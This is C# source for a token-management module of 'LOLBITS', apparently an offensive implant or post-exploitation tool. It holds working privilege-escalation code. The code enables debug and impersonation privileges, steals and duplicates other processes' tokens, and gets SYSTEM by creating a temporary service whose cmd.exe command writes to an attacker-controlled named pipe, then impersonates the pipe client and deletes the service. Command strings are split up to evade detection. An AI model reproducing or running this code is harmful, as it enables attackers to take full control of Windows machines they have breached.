using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Threading;

namespace LOLBITS.TokenManagement
{
    public class TokenManager
    {
        public static IntPtr _token; 
        public static int _method; // 1 = CreateProcessAsUser ; 2 = CreateProcessWithToken ; 3 = RunAs with valid credentials
        public static readonly string[] _credentials = new string[3]; // [1] = Username ; [2] = Domain ('.' for local domain) ; [3] = Password 
        private static string _pipeName;
        private const int _numThreads = 1;
        private readonly SysCallManager sysCall;

        public TokenManager(SysCallManager sysCall)
        {
            _token = IntPtr.Zero;
            _method = 0;
            this.sysCall = sysCall;
        }

        public static void Rev2Self()
        {
            _token = IntPtr.Zero;
            _method = 0;
        }

        /////////////////////////// Impersonation ///////////////////////////

        public bool Impersonate (int pid, SysCallManager sysCall)
        {
            var privileges = new List<string>
            {
                "SeDebugPrivilege",
                "SeImpersonatePrivilege",
                "SeTcbPrivilege",
                "SeAssignPrimaryTokenPrivilege",
                "SeIncreaseQuotaPrivilege"
            };
            
            try
            {
                Utils.GetProcessToken(Process.GetCurrentProcess().Handle, DInvoke.Win32.WinNT._TOKEN_ACCESS_FLAGS.TokenAdjustPrivileges,
                    out var token, sysCall);

                Utils.EnablePrivileges(token, privileges, sysCall);

                Utils.GetProcessHandle(pid, out var handlePointer, DInvoke.Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_INFORMATION, sysCall);

                Utils.GetProcessToken(handlePointer, DInvoke.Win32.WinNT._TOKEN_ACCESS_FLAGS.TokenDuplicate, out var tokenPointer,
                    sysCall);

                Utils.CloseHandle(handlePointer);

                if (tokenPointer == IntPtr.Zero) return false;

                var tokenAccess =
                    DInvoke.Win32.WinNT._TOKEN_ACCESS_FLAGS.TokenQuery | DInvoke.Win32.WinNT._TOKEN_ACCESS_FLAGS.TokenAssignPrimary |
                    DInvoke.Win32.WinNT._TOKEN_ACCESS_FLAGS.TokenDuplicate | DInvoke.Win32.WinNT._TOKEN_ACCESS_FLAGS.TokenAdjustDefault |
                    DInvoke.Win32.WinNT._TOKEN_ACCESS_FLAGS.TokenAdjustSessionId;

                Utils.DuplicateToken(tokenPointer, tokenAccess, DInvoke.Win32.WinNT._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                    DInvoke.Win32.WinNT.TOKEN_TYPE.TokenPrimary, out var impToken, sysCall);

                if (impToken == IntPtr.Zero) return false;


                var startupInfo = new DInvoke.Win32.WinNT.StartupInfo();
                startupInfo.cb = Marshal.SizeOf(startupInfo);
                startupInfo.lpDesktop = "";
                startupInfo.wShowWindow = 0;
                startupInfo.dwFlags |= 0x00000001;

                var processInfo = new DInvoke.Win32.Kernel32.ProcessInformation();

                if (_method == 0)
                {
                    try
                    {
                        Utils.DetermineImpersonationMethod(impToken, new DInvoke.Win32.Kernel32.LogonFlags(), startupInfo, out processInfo);
                    }
                    catch
                    {
                        return false;                        
                    }
                }

                if (_method != 0)
                {
                    _token = impToken;
                    return true;
                }
            }
            catch
            {

            }

            return false;
        }

        public bool GetSystem(SysCallManager sysCall)
        {

            try
            {
                int pid = Utils.getSystemPID(sysCall);
                if (Impersonate(pid, sysCall))
                    return true;
            }
            catch {}
 
            _pipeName = Jobs.RandomString(7);

            string service = Jobs.RandomString(7);
            var exit = false;
            var server = new Thread(ServerThread);

            var cmd = "sc create " + service + " binpath= \"c:\\windows\\sys" + "tem32\\cm" + "d.exe /C " + "echo data > \\\\.\\pi" + "pe\\" + _pipeName + "\"";
            Utils.ExecuteCommand(cmd, sysCall);

            server.Start();
            Thread.Sleep(250);

            cmd = "sc start " + service;
            Utils.ExecuteCommand(cmd, sysCall);

            while (!exit)
            {
                if (server.Join(250))
                    exit = true;
            }


            cmd = "sc delete " + service;
            Utils.ExecuteCommand(cmd, sysCall);

            if (_token != IntPtr.Zero)
                return true;

            return false;
        }

        public static bool RunAs(string domain, string user, string password)
        {
            Utils.RunAs(domain, user, password);

            return _method == 3;
        }

        private static void ServerThread(object data)
        {
            var pipeServer = new NamedPipeServerStream(_pipeName, PipeDirection.InOut, _numThreads);
            var threadId = Thread.CurrentThread.ManagedThreadId;

            pipeServer.WaitForConnection();

            try
            {
                var ss = new StreamString(pipeServer);

                var filename = ss.ReadString();
                var fileReader = new Utils();

                pipeServer.RunAsClient(Utils.Start);

            }
            catch
            {

            }
            finally
            {
                pipeServer.Close();
            }
        }

    }
}
